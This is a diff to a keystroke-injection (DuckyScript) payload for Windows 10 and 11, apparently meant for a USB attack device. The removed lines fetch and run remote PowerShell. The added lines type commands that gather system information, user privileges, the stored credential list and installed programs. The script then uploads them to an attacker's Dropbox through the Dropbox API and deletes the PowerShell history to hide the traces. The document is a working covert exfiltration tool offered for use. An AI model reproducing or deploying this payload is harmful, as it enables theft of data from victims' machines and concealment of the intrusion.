@@ -3,44 +3,51 @@ REM_BLOCK DOCUMENTATION
     Author: PlumpyTurkey
     Description: This payload sends you a brief user privilege escalation report via Dropbox.
     Target: Windows 10, 11
-    Version: 1.4
+    Version: 1.5
     Category: Exfiltration
 END_REM
 
-EXTENSION RUN_HOSTED_POWERSHELL
+EXTENSION POWERSHELL_TO_DROPBOX
     REM_BLOCK DOCUMENTATION
-        Title: Run Hosted PowerShell
+        Title: PowerShell To Dropbox
         Author: PlumpyTurkey
-        Description: This extension allows you to run a hosted PowerShell script using the Windows Run dialog box.
+        Description: This extension allows you to exfiltrate content available from PowerShell to a file in your Dropbox.
         Target: Windows 10, 11
         Version: 1.1
     END_REM
 
     REM Required options:
-    DEFINE #RHP_SCRIPT_URL example.com
+    DEFINE #PTD_CONTENT $Content
+    DEFINE #PTD_REFRESH_TOKEN XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+    DEFINE #PTD_APP_KEY XXXXXXXXXXXXXXX
+    DEFINE #PTD_APP_SECRET XXXXXXXXXXXXXXX
 
     REM Advanced options:
-    DEFINE #RHP_DELAY 2000
-    DEFINE #RHP_ELEVATED_EXECUTION FALSE
-    DEFINE #RHP_DISABLE_AFTER_EXECUTION FALSE
+    DEFINE #PTD_OUTPUT_FOLDER Exfiltrated-content
+    DEFINE #PTD_OUTPUT_FILE [${env:COMPUTERNAME}-${env:USERNAME}].txt
 
-    FUNCTION RHP_RUN()
-        GUI r
-
-        DELAY #RHP_DELAY
-        STRING PowerShell -W H -EX Bypass "IWR -UseB '#RHP_SCRIPT_URL' | IEX"
-
-        IF_DEFINED_TRUE #RHP_ELEVATED_EXECUTION
-            CTRL SHIFT ENTER
-            DELAY #RHP_DELAY
-            LEFT
-        END_IF_DEFINED
-
-        ENTER
-
-        IF_DEFINED_TRUE #RHP_DISABLE_AFTER_EXECUTION
-            ATTACKMODE OFF
-        END_IF_DEFINED
+    FUNCTION PTD_SEND()
+        STRING_POWERSHELL
+            try { 
+                Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers @{ 
+                    "Authorization" = "Bearer $((
+                    Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method Post -Headers @{ 
+                        "Content-Type" = "application/x-www-form-urlencoded" 
+                    } -Body @{ 
+                        "grant_type" = "refresh_token"; 
+                        "refresh_token" = "#PTD_REFRESH_TOKEN"; 
+                        "client_id" = "#PTD_APP_KEY"; 
+                        "client_secret" = "#PTD_APP_SECRET" 
+                    }
+                ).access_token)"; 
+                    "Content-Type" = "application/octet-stream"; 
+                    "Dropbox-API-Arg" = "{""path"":""/#PTD_OUTPUT_FOLDER/#PTD_OUTPUT_FILE"",""mode"":""add"",""autorename"":true,""mute"":false}" 
+                } -Body #PTD_CONTENT | Out-Null 
+            } 
+            catch { 
+                Write-Host "An error occurred: $_" 
+            }
+        END_STRING
     END_FUNCTION
 END_EXTENSION
 
@@ -108,4 +115,34 @@ EXTENSION WINDOWS_ONLY
     END_IF
 END_EXTENSION
 
-RHP_RUN()
+REM Advanced options:
+DEFINE #SHORT_DELAY 500
+DEFINE #MEDIUM_DELAY 2000
+DEFINE #DISABLE_AFTER_EXECUTION TRUE
+
+GUI x
+
+DELAY #SHORT_DELAY
+STRING i
+
+DELAY #MEDIUM_DELAY
+STRING_POWERSHELL
+    Clear-Host;
+    $Content = "*** System Information ***`n $(SYSTEMINFO | Out-String)`n";
+    $Content += "*** User Information ***`n $(WHOAMI /ALL | Out-String)`n";
+    $Content += "*** Stored Credentials ***`n $(CMDKEY /LIST | Out-String)`n";
+    $Content += "*** Installed Programs ***`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)`n";
+END_STRING
+
+PTD_SEND()
+
+STRING_POWERSHELL
+    Remove-Item (Get-PSReadLineOption).HistorySavePath;
+    exit
+END_STRING
+
+ENTER
+
+IF_DEFINED_TRUE #DISABLE_AFTER_EXECUTION
+    ATTACKMODE OFF
+END_IF_DEFINED
